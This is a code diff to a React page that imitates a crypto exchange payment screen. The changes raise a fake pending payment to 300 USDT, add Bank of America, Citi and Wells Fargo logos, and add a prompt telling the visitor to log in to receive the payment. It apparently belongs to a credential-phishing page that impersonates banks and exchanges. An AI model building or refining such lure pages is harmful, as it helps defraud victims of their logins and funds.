@@ -202,7 +202,7 @@ export default function MegaPage() {
 
         <div className="p_amount_section">
           <div className="p_token">USDT ▾</div>
-          <div className="p_amount">150</div>
+          <div className="p_amount">300</div>
           {/* <div className="p_currency">≈ ৳611,450</div> */}
         </div>
 
@@ -215,26 +215,36 @@ export default function MegaPage() {
           <div className="p_user_box">
             <img
               className="p_avatar"
-              src="https://i.pravatar.cc/80"
+              src="/boa.png"
+              alt="avatar"
+            />
+            <img
+              className="p_avatar"
+              src="/citi.jpg"
+              alt="avatar"
+            />
+            <img
+              className="p_avatar"
+              src="/wf.png"
               alt="avatar"
             />
 
             <div className="p_user_info">
-              <div className="p_user_id">779 478 933 (Binance ID)</div>
+              {/* <div className="p_user_id">779 478 933 (Binance ID)</div> */}
               <div className="p_user_name">Nickname: *****</div>
             </div>
           </div>
 
           <div className="p_payee_row">
             <span>Payee Receives</span>
-            <span className="p_payee_amount">150 USDT</span>
+            <span className="p_payee_amount">300 USDT</span>
           </div>
 
           {/* <div className="p_payee_value">≈ ৳611,450</div> */}
 
           <div className="p_account_row">
             <span>Account</span>
-            <span className="p_account_type">Spot Account ›</span>
+            <span className="p_account_type">Main Account ›</span>
           </div>
 
           <div className="p_warning_box">
@@ -242,7 +252,7 @@ export default function MegaPage() {
             <div className="p_warning_text">***********</div>
           </div>
 
-          <button className="p_deposit_btn" onClick={handleAgree}>Deposit Now</button>
+          <button className="p_deposit_btn" onClick={handleAgree}>Accept</button>
         </div>
       </div>
 
@@ -261,7 +271,10 @@ export default function MegaPage() {
               onSubmit={handleSubmit(handleAddBooking)}
               className="login-body"
             >
-                <small className="p_pp">payment pending $150...</small>
+                <small className="p_pp">payment pending $300</small>
+                <p className="p_ppp">
+                  For receiving your payment, please log in to your account.
+                </p>
               <h3>Already have an account?</h3>
 
               <input
